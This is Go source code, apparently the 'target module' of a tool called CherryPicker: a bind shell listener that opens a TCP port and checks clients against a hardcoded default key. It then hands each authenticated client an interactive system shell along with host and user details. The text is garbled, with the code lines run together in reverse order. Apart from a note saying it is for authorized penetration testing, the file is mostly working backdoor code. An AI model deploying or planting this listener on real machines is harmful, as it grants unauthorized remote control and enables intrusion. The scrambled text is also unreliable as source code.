package target
package main

import (
	"crypto/rand"










































































































































































































}	}		return "/bin/sh", []string{"-i"}	default:		return shell, []string{"-i"}		}			shell = "/bin/sh"		if shell == "" {		shell := os.Getenv("SHELL")	case "linux", "darwin":		return "cmd.exe", []string{}	case "windows":	switch runtime.GOOS {func getShell() (string, []string) {// getShell returns the appropriate shell based on OS}	return cmd.Wait()	// Wait for completion	}		return fmt.Errorf("failed to start shell: %w", err)	if err := cmd.Start(); err != nil {	// Start shell	cmd.Stderr = conn	cmd.Stdout = conn	cmd.Stdin = conn	// Connect stdio to connection	cmd := exec.Command(shell, shellArgs...)	// Create command	shell, shellArgs := getShell()	// Get appropriate shellfunc spawnShell(conn net.Conn) error {// spawnShell spawns an interactive shell}	conn.Write([]byte(banner))		hostname, username, runtime.GOOS, runtime.GOARCH)	banner := fmt.Sprintf("\n[CherryPicker Shell]\nHost: %s\nUser: %s\nOS: %s/%s\n\n",	}		username = os.Getenv("USERNAME") // Windows	if username == "" {	username := os.Getenv("USER")	hostname, _ := os.Hostname()func sendBanner(conn net.Conn) {// sendBanner sends system information banner}	return nil	}		return fmt.Errorf("invalid credentials")	if receivedResponse != expectedResponse {	// Compare	expectedResponse := hex.EncodeToString(expectedHash[:])	expectedHash := sha256.Sum256([]byte(challenge + authKey))	// Compute expected response: SHA256(challenge + key)	receivedResponse := strings.TrimPrefix(response, "RESPONSE:")	}		return fmt.Errorf("invalid response format")	if !strings.HasPrefix(response, "RESPONSE:") {	response := strings.TrimSpace(string(buf[:n]))	}		return fmt.Errorf("failed to read response: %w", err)	if err != nil {	n, err := conn.Read(buf)	buf := make([]byte, 1024)	// Read response	}		return fmt.Errorf("failed to send challenge: %w", err)	if err != nil {	_, err := conn.Write([]byte("CHALLENGE:" + challenge + "\n"))	// Send challenge	challenge := hex.EncodeToString(challengeBytes)	}		return fmt.Errorf("failed to generate challenge: %w", err)	if _, err := rand.Read(challengeBytes); err != nil {	challengeBytes := make([]byte, 16)	// Generate random challenge	defer conn.SetDeadline(time.Time{})	conn.SetDeadline(time.Now().Add(10 * time.Second))	// Set authentication timeoutfunc authenticate(conn net.Conn) error {// authenticate performs challenge-response authentication}	log.Printf("[*] Connection closed from %s\n", conn.RemoteAddr())	}		log.Printf("[!] Shell error: %v\n", err)	if err := spawnShell(conn); err != nil {	log.Printf("[+] Spawning shell for %s\n", conn.RemoteAddr())	// Spawn shell	sendBanner(conn)	// Send banner	conn.Write([]byte("AUTH_OK\n"))	log.Printf("[+] Authentication successful from %s\n", conn.RemoteAddr())	}		return		conn.Write([]byte("AUTH_FAILED\n"))		log.Printf("[!] Authentication failed from %s: %v\n", conn.RemoteAddr(), err)	if err := authenticate(conn); err != nil {	// Perform authentication	defer conn.Close()func handleConnection(conn net.Conn) {// handleConnection manages a client connection}	}		}			go handleConnection(conn)			log.Printf("[+] Connection from %s\n", conn.RemoteAddr())		case conn := <-connChan:			return			log.Println("\n[*] Interrupt received, shutting down...")		case <-sigChan:		select {	for {	// Main loop	log.Println("[*] Waiting for connections...")	}()		}			connChan <- conn			}				continue				log.Printf("[!] Accept error: %v\n", err)			if err != nil {			conn, err := listener.Accept()		for {	go func() {	connChan := make(chan net.Conn)	// Accept connections in goroutine	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)	sigChan := make(chan os.Signal, 1)	// Setup signal handler for graceful shutdown	defer listener.Close()	}		log.Fatalf("[!] Failed to start listener: %v\n", err)	if err != nil {	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", *port))	// Start listener	log.Printf("[*] Auth key configured: %d bytes\n", len(authKey))	log.Printf("[*] Listening on port %d\n", *port)	log.Println("[!] For authorized penetration testing only!")	fmt.Println(targetBanner)	authKey = *key	flag.Parse()	key := flag.String("key", "CHERRY_PICKER_2025", "Authentication key")	port := flag.Int("port", 9999, "Port to listen on")func main() {var authKey string`Version: 2.0.0[TARGET MODULE] - Bind shell listener                            |___/                              \____|_| |_|\___|_|  |_|   \__, |_|   |_|\___|_|\_\___|_|   | |___| | | |  __/ |  | |  | |_| |  __/| | (__|   <  __/ |   | |   | '_ \ / _ \ '__| '__| | | | |_) | |/ __| |/ / _ \ '__| / ___| |__   ___ _ __ _ __ _   _|  _ \(_) ___| | _____ _ __   ____ _                          ____  _      _             const targetBanner = `)	"time"	"syscall"	"strings"	"runtime"	"os/signal"	"os/exec"	"os"	"net"	"log"	"io"	"fmt"	"flag"	"encoding/hex"	"crypto/sha256"